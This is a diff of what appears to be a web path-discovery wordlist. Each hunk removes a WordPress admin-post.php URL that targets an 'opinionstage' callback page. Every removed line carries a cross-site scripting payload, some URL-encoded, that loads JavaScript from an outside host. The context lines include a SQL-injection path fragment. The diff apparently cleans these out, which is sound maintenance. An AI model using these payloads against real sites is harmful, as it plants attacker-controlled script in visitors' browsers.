@@ -1368,7 +1368,6 @@ blog/phpmyadmin/
 logo.php
 public/css/errorcss.css
 maingphp_error.log
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
 apsis
 Dx.php
 fckeditor.js
@@ -1395,7 +1394,6 @@ period
 bamboo
 datentechnik
 trigger.yaml
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
 opensearchdescriptor.jsp
 dpadmin
 ddos.php
@@ -1539,7 +1537,6 @@ gradlew
 stackshield
 adminhome.php
 config.codekit
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();
 lib/flex/uploader/.settings
 Howard
 .env_1
@@ -5504,7 +5501,6 @@ wp-content/plugins/photo-gallery/css/bwg_edit_image.css
 *do=lastcomments
 p/
 easyphpcalendar
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();
 tmsnc
 (pty)
 .htaccess.swp
@@ -6309,7 +6305,6 @@ wp-content/plugins/hd-webplayer/playlist.php?videoid=1+and+1=2+/*!union*/+/*!sel
 phpMyAdmin2/
 admincp/js/kindeditor/
 page_admin.php
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v15\'></script>
 .nyc_output
 front-empathy/.env
 node/add/
@@ -8688,7 +8683,6 @@ faethon
 *do=register
 .cask
 dev.env
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v6%5C'%3E%3C/script%3E
 media/.env
 nirvagi.php
 journalness
@@ -9871,7 +9865,6 @@ venture
 ops/
 sbt
 forever5pi.asp
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v6%5C'%3E%3C/script%3E
 _database
 emails.config
 phpmyadmin._2/index.php
@@ -14059,7 +14052,6 @@ rjs/
 sniper.php
 permission.txt
 nikki
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v15%5C'%3E%3C/script%3E
 phpMyAdmin/scripts/setup.php
 nirvagam_seipavar.gzip
 cgi-win/emu/html/emumail.cgi
@@ -21036,7 +21028,6 @@ admin-dev/export
 .idea_modules
 backup.lz
 kazaa
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();
 console/login/LoginForm.jsp
 dian
 NFT
@@ -21096,7 +21087,6 @@ landing.txt
 .blg
 .well-known/jwks.json
 .vim.netrwhist
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
 aldemo.sql
 pro/*/reserva*
 graphite/
@@ -25224,7 +25214,6 @@ phpMyAdmin-2.11.7.1-all-languages-utf-8-only/
 .shodan/api_key
 bea_wls_deployment_internal/DeploymentService
 font
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();&uid=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();&token=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();&email=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();
 sh3ll.php
 WEB-INF/faces-config-DataOrderedList.xml
 .ashx
@@ -28046,7 +28035,6 @@ phpMyAdmin-2.5.1/
 debug/pprof/heap
 sonarqube
 scripts/main.cgi
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=(function()%20%7B%20var%20elem%20=%20document.createElement(%5C'script%5C');%20elem.type%20=%20%5C'text/javascript%5C';%20elem.src%20=%20%5C'https://slow.destinyfernandi.com/hos?clod%5C';document.getElementsByTagName(%22head%22)[0].appendChild(elem);%7D)();
 mpcgi/magiccard.cgi
 search.php?do[]=[test.dll]
 nosetests.xml
@@ -31857,7 +31845,6 @@ pearl
 alxala
 vocabulary/
 _cat
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v15%5C'%3E%3C/script%3E
 15.php
 westinit.sh
 sql/phpMyAdmin
@@ -33082,7 +33069,6 @@ helloworld
 disclaimer
 password_change.cgi
 magnum-ci.yml
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
 pentaho
 h1.php
 _char.sql
@@ -33596,7 +33582,6 @@ obj.pkl
 cameraz.zip
 vivendi
 htbin/gH.cgi
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&token=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v6%5C'%3E%3C/script%3E
 shtml.exe
 node-helper.sh
 controllers
@@ -34507,7 +34492,6 @@ cgi-exe/mail/emumail.cgi
 nwp-content
 gotoURL.asp?url=google.com&id=43569
 git.txt
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();&uid=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();&token=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();&email=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();&fly_id=1&article_placement_id=1&sidebar_placement_id=1&return_path=(function() { var elem = document.createElement(\'script\'); elem.type = \'text/javascript\'; elem.src = \'https://slow.destinyfernandi.com/hos?clod\';document.getElementsByTagName("head")[0].appendChild(elem);})();
 api.tar.gz
 emails_deduped.txt
 myezshop
@@ -36014,7 +35998,6 @@ web-inf/classes/struts.xml
 download/users.csv
 openvpnadmin
 colony
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&success="><script type=text/javascript src=\'https://slow.destinyfernandi.com/hos?&v6\'></script>
 simple_gbook.sql
 .sql.gz
 data.rar
@@ -36755,7 +36738,6 @@ lol.rar
 cgibin/search/search.cgi
 nuzhaivu.php
 api/timelion/run
-wp-admin/admin-post.php?page=opinionstage-content-login-callback-page&email=%22%3E%3Cscript%20type=text/javascript%20src=%5C'https://slow.destinyfernandi.com/hos?&v15%5C'%3E%3C/script%3E
 show
 .conda
 testing1.php
